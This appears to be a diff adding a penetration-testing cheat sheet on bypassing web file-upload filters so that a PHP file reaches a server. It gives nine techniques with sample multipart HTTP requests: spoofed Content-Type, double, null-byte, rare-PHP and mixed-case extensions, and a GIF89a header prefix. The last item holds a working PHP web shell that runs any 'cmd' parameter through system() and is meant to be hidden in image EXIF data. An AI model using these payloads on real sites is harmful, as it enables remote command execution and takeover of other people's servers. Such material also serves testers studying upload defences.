@@ -1,0 +1,80 @@
+1.	Change the Content-Type
+
+	POST /images/upload/ HTTP/1.1
+	Host: target.com
+	[...]
+
+	---------------------------829348923824
+	Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+	Content-Type: application/x-php
+			
+	Try this to bypass
+
+	POST /images/upload/ HTTP/1.1
+	Host: target.com
+	[...]
+
+	---------------------------829348923824
+	Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+	Content-Type: image/jpeg
+			
+2.	Try to change the extension when send the request, for example in here you cant upload file with ext php but you can upload jpg file
+
+	POST /images/upload/ HTTP/1.1
+	Host: target.com
+	[...]
+
+	---------------------------829348923824
+	Content-Disposition: form-data; name="uploaded"; filename="dapos.php.jpg"
+	Content-Type: application/x-php
+			
+	Change the request to this
+
+	POST /images/upload/ HTTP/1.1
+	Host: target.com
+	[...]
+
+	---------------------------829348923824
+	Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+	Content-Type: application/x-php
+			
+3.	Upload the payload, but start with GIF89a;
+
+	POST /images/upload/ HTTP/1.1
+	Host: target.com
+	[...]
+
+	---------------------------829348923824
+	Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+	Content-Type: image/gif
+
+	GIF89a; //your_code
+			
+	And dont forget to change the Content-Type to image/gif
+
+
+4. Bypass content length validation, it can be bypassed using small payload
+	ex :
+	https://i.ibb.co/ssfNw3G/image.png
+
+5.	Using null byte in filename
+
+	file.php%00.gif
+			
+6.	Using double extensions for the uploaded file
+
+	file.jpg.php
+			
+7.	Uploading an unpopular php extensions (php4,php5,php6,phtml)
+
+	file.php5
+			
+8.	Try to randomly capitalizes the file extension
+
+	file.pHP5
+	
+9.	Try edit the images/gif with ExiF Image Editor 
+	Put this code in :
+	<style>body{font-size: 0;} h1{font-size: 12px}</style><h1><?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo 'Hey iam here';}__halt_compiler();?></h1>
+	
+	make the extension .php or .jpg then you can bypass it with burpsuite
